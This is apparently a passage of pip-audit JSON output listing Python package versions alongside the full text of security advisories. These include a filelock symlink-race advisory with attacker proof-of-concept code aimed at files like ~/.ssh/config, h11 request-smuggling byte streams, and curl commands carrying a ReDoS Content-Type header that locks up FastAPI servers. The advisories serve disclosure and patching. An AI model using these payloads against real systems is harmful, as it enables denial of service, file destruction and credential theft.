The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? \u2192 False T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable?

Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} \u2192 {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # \u2190 VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // \u2190 Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # \u2190 Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "flake8", "version": "6.1.0", "vulns": []}, {"name": "fonttools", "version": "4.61.1", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "grpcio", "version": "1.76.0", "vulns": []}, {"name": "h11", "version": "0.14.0", "vulns": [{"id": "CVE-2025-43859", "fix_versions": ["0.16.0"], "aliases": ["GHSA-vqfr-h8mv-ghfj"], "description": "### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09."}]}, {"name": "h2", "version": "4.3.0", "vulns": []}, {"name": "hiredis", "version": "3.3.0", "vulns": []}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "0.17.3", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.25.1", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "importlib-metadata", "version": "8.7.0", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "ipython", "version": "8.17.2", "vulns": []}, {"name": "isort", "version": "5.12.0", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.3.2", "vulns": []}, {"name": "jsonschema", "version": "4.21.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "kiwisolver", "version": "1.4.9", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "loguru", "version": "0.7.2", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "matplotlib", "version": "3.8.2", "vulns": []}, {"name": "matplotlib-inline", "version": "0.2.1", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.7.0", "vulns": []}, {"name": "mypy", "version": "1.7.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "numpy", "version": "1.24.3", "vulns": []}, {"name": "opentelemetry-api", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.60b1", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "paho-mqtt", "version": "1.6.1", "vulns": []}, {"name": "pandas", "version": "2.1.3", "vulns": []}, {"name": "parso", "version": "0.8.5", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "pillow", "version": "12.0.0", "vulns": []}, {"name": "pip", "version": "25.3", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "portalocker", "version": "3.2.0", "vulns": []}, {"name": "pre-commit", "version": "3.5.0", "vulns": []}, {"name": "prometheus-client", "version": "0.19.0", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.52", "vulns": []}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "protobuf", "version": "6.33.2", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pycodestyle", "version": "2.11.1", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pydantic", "version": "2.5.0", "vulns": []}, {"name": "pydantic-core", "version": "2.14.1", "vulns": []}, {"name": "pydantic-settings", "version": "2.1.0", "vulns": []}, {"name": "pyflakes", "version": "3.1.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pytest", "version": "7.4.3", "vulns": []}, {"name": "pytest-asyncio", "version": "0.21.1", "vulns": []}, {"name": "pytest-cov", "version": "4.1.0", "vulns": []}, {"name": "pytest-mock", "version": "3.12.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.0.0", "vulns": []}, {"name": "python-jose", "version": "3.3.0", "vulns": [{"id": "PYSEC-2024-232", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33663", "GHSA-6c5p-j8vq-pqhj"], "description": "python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "CVE-2024-53981", "fix_versions": ["0.0.18"], "aliases": ["GHSA-59g5-xgcq-4qw3"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary.

An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}]}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.1", "vulns": []}, {"name": "qdrant-client", "version": "1.16.2", "vulns": []}, {"name": "redis", "version": "5.0.1", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "requests", "version": "2.31.0", "vulns": [{"id": "CVE-2024-35195", "fix_versions": ["2.32.0"], "aliases": ["GHSA-9wx4-h78v-vm56"], "description": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`.
